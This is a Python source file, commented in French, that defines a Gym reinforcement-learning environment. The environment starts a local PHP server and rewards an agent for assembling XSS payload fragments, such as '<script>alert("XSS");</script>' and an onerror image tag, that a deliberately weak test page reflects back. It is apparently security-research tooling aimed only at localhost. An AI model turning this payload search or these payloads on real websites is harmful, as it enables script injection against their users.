import gym
from gym import spaces
import subprocess
import requests
import random
import time


class XSSGym(gym.Env):
    """Environnement personnalisé pour tester la construction de payloads XSS."""

    metadata = {'render.modes': ['human']}

    def __init__(self):
        super(XSSGym, self).__init__()

        # Définir l'espace d'action: choisir parmi des fragments de payload
        self.fragments = ['<script>', 'alert("XSS");', '</script>', '"<img src=x onerror=alert(1)>',
                          'javascript:alert(1)', '-->', '>', '"/>']
        self.action_space = spaces.Discrete(len(self.fragments))  # Nombre de fragments
        self.max_fragments = 6

        # États: représentation numérique de la réponse (0 = pas de XSS, 1 = XSS)
        self.observation_space = spaces.Discrete(2)

        # Chemin vers le dossier contenant les fichiers PHP
        self.php_directory = "./php_files"
        self.php_files = ['security_low.php']

        # Serveur PHP
        self.server = subprocess.Popen(['php', '-S', 'localhost:8000', '-t', self.php_directory])
        time.sleep(2)  # Attendre que le serveur démarre

    def step(self, action):
        # Appliquer l'action pour construire le payload
        self.current_payload += self.fragments[action]

        if len(self.current_payload.split()) > self.max_fragments:
            return 0, -1, True, {'message': 'Payload limit reached'}

        # Choisir un fichier PHP au hasard pour tester le payload
        target_file = random.choice(self.php_files)
        url = f"http://localhost:8000/{target_file}"
        response = requests.get(url, params={'message': self.current_payload})

        state, reward = self.evaluate_payload(response.text)
        done = state == 1

        return state, reward, done, {}

    def evaluate_payload(self, response_text):
        if '<script>alert("XSS");</script>' in response_text:
            return 1, 10  # High reward for exact match
        elif '<script>' in response_text and '</script>' in response_text:
            return 0, 5  # Moderate reward for correct context
        elif '<script>' in response_text or '</script>' in response_text:
            return 0, 1  # Small penalty for partial match
        return 0, -2  # Higher penalty for no match


    def reset(self):
        # Réinitialiser le payload et l'état initial
        self.current_payload = ''
        return 0  # État initial arbitraire

    def render(self, mode='human', close=False):
        # Afficher le payload actuel
        if mode == 'human':
            print(f"Current Payload: {self.current_payload}")

    def close(self):
        # Arrêter le serveur PHP
        self.server.terminate()
        self.server.wait()

    @classmethod
    def make(cls):
        return cls()


if __name__ == "__main__":
    env = XSSGym()
    obs = env.reset()
    done = False
    while not done:
        action = env.action_space.sample()  # Choisir une action aléatoirement
        obs, reward, done, _ = env.step(action)
        env.render()
    env.close()
